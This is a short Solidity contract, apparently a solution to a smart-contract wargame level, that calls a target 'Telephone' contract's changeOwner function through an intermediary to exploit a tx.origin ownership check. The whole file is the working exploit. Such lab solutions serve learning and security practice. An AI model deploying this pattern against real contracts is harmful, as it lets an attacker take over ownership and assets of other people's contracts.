// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./interfaces/ITelephone.sol";

contract AttackTelephone {

  address public telephoneContract;

  constructor(address _telephoneContract) public {
    telephoneContract = _telephoneContract;
  }

  function changeOwnerTelephone() public {
    ITelephone(telephoneContract).changeOwner(msg.sender);
  }
}